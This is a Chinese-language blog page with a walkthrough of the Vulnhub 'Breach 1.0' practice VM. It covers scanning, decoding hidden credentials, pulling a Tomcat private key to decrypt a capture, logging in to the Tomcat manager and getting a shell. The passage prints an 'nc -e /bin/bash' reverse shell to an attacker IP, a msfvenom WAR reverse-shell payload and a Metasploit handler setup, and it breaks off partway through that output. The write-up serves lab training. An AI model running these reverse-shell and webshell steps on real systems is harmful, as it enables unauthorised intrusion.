@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Breach靶场靶场环境：Breach1.0攻击环境：Kali2 LinuxIP配置：将vmware主机模式IP段设置为192.168.110.0,攻击主机全部设置为主机模式。 下载Vulnhub的Breach1.0解压后导入VMware中。导入后我们需要把主机模式IP段设置为192.168.110.0，然后把攻击机全部设置为主机模式：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Breach-1.0">
+<meta property="og:url" content="http://yoursite.com/2019/06/26/Breach-1-0/index.html">
+<meta property="og:site_name" content="Guko&#39;s Blog">
+<meta property="og:description" content="Breach靶场靶场环境：Breach1.0攻击环境：Kali2 LinuxIP配置：将vmware主机模式IP段设置为192.168.110.0,攻击主机全部设置为主机模式。 下载Vulnhub的Breach1.0解压后导入VMware中。导入后我们需要把主机模式IP段设置为192.168.110.0，然后把攻击机全部设置为主机模式：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/25.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/26.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/17.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/18.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/19.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/20.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/21.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/22.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/23.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/26/Breach-1-0/27.png">
+<meta property="og:updated_time" content="2019-07-01T06:12:21.160Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Breach-1.0">
+<meta name="twitter:description" content="Breach靶场靶场环境：Breach1.0攻击环境：Kali2 LinuxIP配置：将vmware主机模式IP段设置为192.168.110.0,攻击主机全部设置为主机模式。 下载Vulnhub的Breach1.0解压后导入VMware中。导入后我们需要把主机模式IP段设置为192.168.110.0，然后把攻击机全部设置为主机模式：">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/26/Breach-1-0/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/26/Breach-1-0/">
+
+
+
+
+
+  <title>Breach-1.0 | Guko's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Guko's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/26/Breach-1-0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Guko">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guko's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Breach-1.0</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-26T09:11:43+08:00">
+                2019-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  16 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="Breach靶场"><a href="#Breach靶场" class="headerlink" title="Breach靶场"></a>Breach靶场</h4><p>靶场环境：Breach1.0<br>攻击环境：Kali2 Linux<br>IP配置：将vmware主机模式IP段设置为192.168.110.0,攻击主机全部设置为主机模式。</p>
+<p>下载Vulnhub的<a href="https://download.vulnhub.com/breach/Breach-1.0.zip" target="_blank" rel="noopener">Breach1.0</a>解压后导入VMware中。导入后我们需要把主机模式IP段设置为192.168.110.0，然后把攻击机全部设置为主机模式：</p>
+<a id="more"></a>
+<p><img src="/2019/06/26/Breach-1-0/1.png" alt="1"><br><img src="/2019/06/26/Breach-1-0/2.png" alt="2"><br>重启后攻击机和靶场就能通信了，貌似不重启也行的:(<br><img src="/2019/06/26/Breach-1-0/3.png" alt="3"></p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>arp-scan<br>masscan<br>nmap<br>nikto<br>nc<br>firefox<br>burp suite<br>wireshark<br>msf</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>我们使用arp-scan来检测我们的目标IP，192.168.110.140就是我们的目标机器<br><img src="/2019/06/26/Breach-1-0/4.png" alt="4"></p>
+<p>现在我们使用nmap来扫描一下目标机器，192.168.110.140的端口情况，发现目标机器开了全部的端口不知道是什么情况，那就直接访问80端口，发现网站。<br><img src="/2019/06/26/Breach-1-0/5.png" alt="5"><br>看到了网站，作为菜鸡一枚先上扫描器试试，就用kali自带的nikto，扫描一下80端口上的服务<br><img src="/2019/06/26/Breach-1-0/6.png" alt="6"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># nikto -host 192.168.110.140 output 192.168.110.140_nikto.txt</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.110.140</span><br><span class="line">+ Target Hostname:    192.168.110.140</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2019-06-27 13:56:20 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use &amp;apos;-C all&amp;apos; to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ IP address found <span class="keyword">in</span> the &amp;apos;location&amp;apos; header. The IP is &amp;quot;127.0.1.1&amp;quot;.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP <span class="keyword">in</span> the Location header via a request to /images over HTTP/1.0. The value is &amp;quot;127.0.1.1&amp;quot;.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 44a, size: 534a04f49139d, mtime: gzip</span><br><span class="line">+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ OSVDB-3268: /images/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.</span><br><span class="line">+ 7916 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2019-06-27 13:57:29 (GMT8) (69 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
+<p>找到一个<code>images</code>目录，访问看看有什么收获不，发现几张图片，不知道干嘛的<br><img src="/2019/06/26/Breach-1-0/7.png" alt="7"><br>试试用<code>strings</code>打印图片中的字符,发现<code>bill.png</code>中有两个字符，分别为<code>tEXtComment</code> <code>coffeestains</code>目前不清楚干嘛的，先拿个小本本记一下<br><img src="/2019/06/26/Breach-1-0/25.png" alt="25"><br><img src="/2019/06/26/Breach-1-0/26.png" alt="26"></p>
+<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>翻翻网站源代码，发现一串很像base64编码的代码，<code>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</code>提取出来用<code>burpsuite</code>解码一下看看<br><img src="/2019/06/26/Breach-1-0/8.png" alt="8"></p>
+<p>经过两次的<code>base64</code>编码发现了一个账户名跟密码<code>pgibbons:damnitfeel$goodtobeagang$ta</code><br><img src="/2019/06/26/Breach-1-0/9.png" alt="9"><br>并且发现了一个<code>initech.html</code>,访问看看发现是一个CMS，那么上面解码出来的账户名跟密码应该就是这个吗CMS的登录账户跟密码啦，登录试试看，成功登录！<br><img src="/2019/06/26/Breach-1-0/11.png" alt="11"><br><img src="/2019/06/26/Breach-1-0/12.png" alt="12"><br>登录成功后发现有三封邮件，在第三方中发现说有一个文件<code>.keystore</code>,我们去把它下载下来<br><img src="/2019/06/26/Breach-1-0/13.png" alt="13"><br>我们在其中搜索<code>ssl</code>发现一个<code>ssl</code>的下载链接并且是<code>pcap</code>包的，这里提示了一个用户名跟密码都是<code>tomcat</code>的情况，那么我们猜测应该存在一个<code>tomcat</code>的网站，且这里说了这是一个红队的攻击流量包，（不知道理解的对不对）那么<code>tomcat</code>网站的连接不就在里面吗。我们把<code>pcap</code>包下载下来用<code>wireshark</code>分析分析趴！但是很不幸，发现所有TCP流量包全部被加密了，我们想到之前下载过一个<code>.keystore</code>这个应该是tomcat 秘钥库文件，使用<code>keytool</code>密码<code>tomcat</code>来检查它</p>
+<p><img src="/2019/06/26/Breach-1-0/15.png" alt="15"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># keytool -list -v -keystore keystore</span></span><br><span class="line">输入密钥库口令:  </span><br><span class="line">密钥库类型: JKS</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: tomcat</span><br><span class="line">创建日期: 2016年5月21日</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">发布者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">序列号: 60856e88</span><br><span class="line">生效时间: Sat May 21 01:51:07 CST 2016, 失效时间: Fri Aug 19 01:51:07 CST 2016</span><br><span class="line">证书指纹:</span><br><span class="line">	 SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53</span><br><span class="line">	 SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展: </span><br><span class="line"></span><br><span class="line"><span class="comment">#1: ObjectId: 2.5.29.14 Criticality=false</span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 47 6B A3 37 ED A5 1F 0A   0D 61 CA AA 17 9C F4 8C  Gk.7.....a......</span><br><span class="line">0010: 10 64 87 DF                                        .d..</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">JKS 密钥库使用专用格式。建议使用 <span class="string">"keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12"</span> 迁移到行业标准格式 PKCS12。</span><br></pre></td></tr></table></figure>
+
+<p>然后尝试在<code>keystore</code>中提取私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12</span></span><br><span class="line">正在将密钥库 keystore 导入到 myp12file.p12...</span><br><span class="line">输入目标密钥库口令:  </span><br><span class="line">再次输入新口令: </span><br><span class="line">输入源密钥库口令:  </span><br><span class="line">[正在存储myp12file.p12]</span><br><span class="line">root@kali:~<span class="comment"># ls</span></span><br><span class="line">公共  模板  视频  图片  文档  下载  音乐  桌面  core  keystore  myp12file.p12</span><br></pre></td></tr></table></figure>
+
+<p>检查私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># openssl pkcs12 -in myp12file.p12 -nocerts -nodes</span></span><br><span class="line">Enter Import Password:</span><br><span class="line">Bag Attributes</span><br><span class="line">    friendlyName: tomcat</span><br><span class="line">    localKeyID: 54 69 6D 65 20 31 35 36 31 36 32 37 37 33 35 30 34 38 </span><br><span class="line">Key Attributes: &lt;No Attributes&gt;</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT</span><br><span class="line">ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW</span><br><span class="line">HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr</span><br><span class="line">ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY</span><br><span class="line">UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF</span><br><span class="line">nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie</span><br><span class="line">F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol</span><br><span class="line">cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr</span><br><span class="line">SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur</span><br><span class="line">shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8</span><br><span class="line">sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo</span><br><span class="line">sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8</span><br><span class="line">PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU</span><br><span class="line">oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx</span><br><span class="line">XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0</span><br><span class="line">TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg</span><br><span class="line">Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl</span><br><span class="line">hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/</span><br><span class="line">fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu</span><br><span class="line">EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7</span><br><span class="line">ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6</span><br><span class="line">23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr</span><br><span class="line">Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr</span><br><span class="line">geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU</span><br><span class="line">3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA</span><br><span class="line">pHiPhbocjixKJz9xx+pG0jDkrg==</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>将私钥导入Wrieshark,然后重新导入<code>_SSL_test_phase1.pcap</code><br><img src="/2019/06/26/Breach-1-0/16.png" alt="16"><br>这样就可以看到解密后的数据，我们发现了<code>tomcat</code>的后台地址<code>https://192.168.110.140:8443/_M@nag3Me/html</code><br><img src="/2019/06/26/Breach-1-0/17.png" alt="17"><br>然后我们去追踪一下这条GET请求的HTTP流，找到了一个<code>Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code>这个就是tomcat登陆的密码base64编码了<br><img src="/2019/06/26/Breach-1-0/18.png" alt="18"><br>用burpsuite，base64解码一下得到用户名：<code>tomcat</code>密码：<code>Tt\5D8F(#!*u=G)4m7zB</code><br><img src="/2019/06/26/Breach-1-0/19.png" alt="19"></p>
+<p>注意：这里我无法通过firefox直接加载页面，其他浏览器也无法加载！但是当我<code>burp proxy</code>用作代理时，我能够在firefox中添加异常来访问<code>tomcat</code>页面。其他浏览器也可用此方法。</p>
+<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>根据上面的前两行，登录URL应该是<code>https://192.168.110.140:8443/_M@nag3Me/html</code>登录<code>tomcat</code>后台<br><img src="/2019/06/26/Breach-1-0/20.png" alt="20"></p>
+<p>部署war包getsehll,本来想，因为根据说明这里每隔三分钟就会有一个脚本对文件进行清理，所有我们需要反弹shell<br><img src="/2019/06/26/Breach-1-0/21.png" alt="21"></p>
+<p>shell中执行反弹shell命令<br><code>nc -e /bin/bash 192.168.110.128 19888</code><br>kali中监听,我们就收到反弹回来的shell啦<br><code>nc -lvvp -p 19888</code><br><img src="/2019/06/26/Breach-1-0/22.png" alt="22"><br><img src="/2019/06/26/Breach-1-0/23.png" alt="23"></p>
+<p>当然还可以用<code>msfvenom</code>生成的jsp马，通过<code>tomcat</code>后台上传后在<code>kali</code>开监听也可以啦！</p>
+<p>用如下命令生成一个WAR的webshell<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; shell.war</code><br>然后设置<code>msfconsole</code>为监听并在触发上传的webshell后就会返回反向sehll</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> Payload java/jsp_shell_reverse_tcp</span><br><span class="line">Payload =&gt; java/jsp_shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/jsp_shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen 